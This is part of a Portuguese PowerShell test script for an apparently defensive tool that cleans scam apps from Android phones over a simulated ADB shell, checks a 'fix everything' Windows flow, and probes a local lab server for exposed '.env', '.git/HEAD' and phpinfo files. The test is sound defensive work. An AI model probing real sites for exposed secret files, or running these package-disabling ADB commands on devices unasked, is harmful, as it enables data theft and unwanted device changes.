Confere 'um passo que falha não para os outros' (@($rq.Resultados | Where-Object { -not $_.Ok }).Count -eq 1 -and @($rq.Resultados | Where-Object Ok).Count -ge 5)

$htmlC = ConvertTo-EscudoHtml -Titulo 'x' -Nota 90 -NotaAntes 12 -Corrigidos $rc.Resultados -Achados @()
Confere 'relatório mostra antes e depois' ($htmlC -match '12 → 90')
Confere 'relatório lista o que corrigiu' ($htmlC -match 'O que o Escudo corrigiu agora' -and $htmlC -match '✓')

# --- 12. Celular Android: correção pelo cabo (ADB de mentira) -------------------
Confere 'lista Android: tira o app de golpe' ((Remove-EscudoDaListaAndroid -Texto 'com.golpe/.S:com.google.android.marvin.talkback/.T' -Pacotes @('com.golpe')) -eq 'com.google.android.marvin.talkback/.T')
Confere 'lista Android: vazia vira null' ((Remove-EscudoDaListaAndroid -Texto 'com.golpe/.S' -Pacotes @('com.golpe')) -eq 'null')
$aand = @(Get-EscudoAndroidAchados -Dados $dadosAnd -LojasConfiaveis $cfg.lojas_android_confiaveis -Hoje ([datetime]'2026-10-24'))
$script:Cel = @{ Acess = [string]$and.acessibilidade; Notif = [string]$and.notificacoes; Cmds = New-Object System.Collections.ArrayList; Verif = '0' }
$shFake = {
    param([string]$c)
    [void]$script:Cel.Cmds.Add($c)
    switch -Regex ($c) {
        '^settings get secure enabled_accessibility_services' { return $script:Cel.Acess }
        '^settings get secure enabled_notification_listeners' { return $script:Cel.Notif }
        "^settings put secure enabled_accessibility_services '(.*)'$" { $script:Cel.Acess = $Matches[1]; return '' }
        "^settings put secure enabled_notification_listeners '(.*)'$" { $script:Cel.Notif = $Matches[1]; return '' }
        '^settings put global package_verifier_enable 1' { $script:Cel.Verif = '1'; return '' }
        '^settings get global package_verifier_enable' { return $script:Cel.Verif }
        '^pm disable-user --user 0 (\S+)' { return "Package $($Matches[1]) new state: disabled-user" }
        '^pm uninstall' { return 'Success' }
        default { return '' }
    }
}
$ra = Invoke-EscudoAndroidCorrecoes -Achados @($aand | Where-Object { $_.Correcao }) -Shell $shFake -PastaDados $tmp -Perguntar { param($q) $q -match 'com\.atualizacao' }
$golpe = @('com.atualizacao.seguranca')
Confere "android: corrige sem falhar ($(@($ra.Resultados | Where-Object { -not $_.Ok } | ForEach-Object Erro) -join '; '))" (@($ra.Resultados | Where-Object { -not $_.Ok }).Count -eq 0)
foreach ($g in $golpe) { Confere "android: acessibilidade cortada de $g" ($script:Cel.Acess -notmatch [regex]::Escape($g)) }
Confere 'android: app de golpe desativado' ([bool]($script:Cel.Cmds | Where-Object { $_ -like 'pm disable-user --user 0 *' }))
Confere 'android: tira permissão de instalar' ([bool]($script:Cel.Cmds | Where-Object { $_ -match '^appops set \S+ REQUEST_INSTALL_PACKAGES deny$' }))
Confere 'android: só desinstala com sim' (@($script:Cel.Cmds | Where-Object { $_ -like 'pm uninstall*' }).Count -le 1 -and -not ($script:Cel.Cmds | Where-Object { $_ -like 'pm uninstall*' -and $_ -notmatch 'com\.atualizacao' }))
Confere 'android: grava como desfazer' ($ra.Desfazer -and ((Get-Content $ra.Desfazer -Raw) -match 'pm enable --user 0'))
$shNega = { param([string]$c) if ($c -like 'pm disable-user*') { 'Error: Cannot disable an active device admin' } elseif ($c -like 'am start*') { [void]$script:Cel.Cmds.Add($c); '' } else { '' } }
$rn = Invoke-EscudoAndroidCorrecoes -Achados @([pscustomobject]@{ Titulo = 'adm'; Correcao = @{ Tipo = 'and-admin'; Pacote = 'com.golpe.adm' } }) -Shell $shNega -PastaDados $tmp
Confere 'android: admin protegido abre a tela certa e explica' ((-not $rn.Resultados[0].Ok) -and $rn.Resultados[0].Erro -match 'administra' -and ($script:Cel.Cmds -contains 'am start -a android.settings.SECURITY_SETTINGS'))
# --- 13. Fluxo completo "Varrer e corrigir tudo" (Windows simulado) -----------
$script:Diag = 0
$script:OpsTeste = $ops
& $mod {
    param($vulAch, $sauAch, $pasta, $opsT)
    $script:TesteVul = $vulAch; $script:TesteSau = $sauAch; $script:TestePasta = $pasta; $script:TesteOps = $opsT
    Set-Item function:script:Test-EscudoAdmin { $true }
    Set-Item function:script:Get-EscudoOperacoes { $script:TesteOps }
    Set-Item function:script:Get-EscudoPastaDados { $script:TestePasta }
    Set-Item function:script:Invoke-EscudoDiagnostico {
        param([switch]$ComNovidades, [switch]$NaoAbrir)
        $script:TesteN = 1 + [int](Get-Variable -Name TesteN -Scope Script -ValueOnly -ErrorAction SilentlyContinue)
        $a = if ($script:TesteN -eq 1) { $script:TesteVul } else { $script:TesteSau }
        [pscustomobject]@{ Nota = (Get-EscudoNota $a); Achados = $a; Relatorio = 'x'; Estado = $null }
    }
} $avul @(Get-EscudoAchados -Estado $sau -Config $cfg) $tmp $ops
New-Item -ItemType Directory -Path (Join-Path $tmp 'backup'), (Join-Path $tmp 'relatorios') -Force | Out-Null
$script:F.Feito.Clear()
$fluxo = Invoke-EscudoCorrigirTudo -Sim -NaoAbrir 6>$null
Confere "fluxo: nota sobe ($($fluxo.NotaAntes) -> $($fluxo.NotaDepois))" ($fluxo.NotaDepois -gt $fluxo.NotaAntes)
Confere 'fluxo: corrige sem perguntar com -Sim' (@($fluxo.Resultados | Where-Object Ok).Count -ge 8)
Confere 'fluxo: instala a vigia se não estiver instalada' ($script:F.Feito -contains 'vigia')
Confere 'fluxo: varre' ($script:F.Feito -contains 'quick')
Confere 'fluxo: relatório de correção salvo' ((Test-Path $fluxo.Relatorio) -and ((Get-Content $fluxo.Relatorio -Raw) -match 'O que o Escudo corrigiu agora'))
Import-Module (Join-Path (Join-Path $raiz 'modulo') 'EscudoInfinityGuard.psm1') -Force -DisableNameChecking
$mod = Get-Module EscudoInfinityGuard
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue

# --- 10. Servidor de laboratório (opcional) -----------------------------------
if ($UrlLocal) {
    $r = & $mod { param($u) Invoke-EscudoHttp $u } "$UrlLocal/"
    Confere "laboratório responde 200 ($($r.Status))" ($r.Status -eq 200)
    Confere 'laboratório expõe X-Powered-By' ([string]$r.Cabecalhos['x-powered-by'] -match 'PHP/')
    $exp = @(& $mod { param($u) Get-EscudoArquivosExpostos -Base $u } $UrlLocal)
    Confere "acha .env exposto ($($exp -join ','))" ($exp -contains '/.env')
    Confere 'acha .git exposto' ($exp -contains '/.git/HEAD')
    Confere 'acha phpinfo exposto' ($exp -contains '/info.php')
    Confere 'não acusa backup.sql que não existe (404)' ($exp -notcontains '/backup.sql')
    Confere 'não acusa página de erro que responde 200 (dump.sql)' ($exp -notcontains '/dump.sql')
    $r404 = & $mod { param($u) Invoke-EscudoHttp $u } "$UrlLocal/nao-existe"
    Confere "404 não quebra ($($r404.Status))" ($r404.Status -eq 404)
    $red = & $mod { param($u) Invoke-EscudoHttp $u } "$UrlLocal/redireciona.php"
    Confere 'lê redirecionamento sem seguir' ($red.Status -eq 301 -and $red.Local -eq 'https://exemplo.test/')
    $ck = & $mod { param($u) Invoke-EscudoHttp $u } "$UrlLocal/cookie.php"
    Confere "lê vários cookies ($($ck.Cookies.Count))" ($ck.Cookies.Count -eq 2)
}

Write-Host ''
Write-Host "Escudo (PC/Android/site): $($script:ok) testes ok, $($script:falhas.Count) falha(s)"
foreach ($f in $script:falhas) { Write-Host "  FALHOU: $f" -ForegroundColor Red }
if ($script:falhas.Count) { exit 1 }
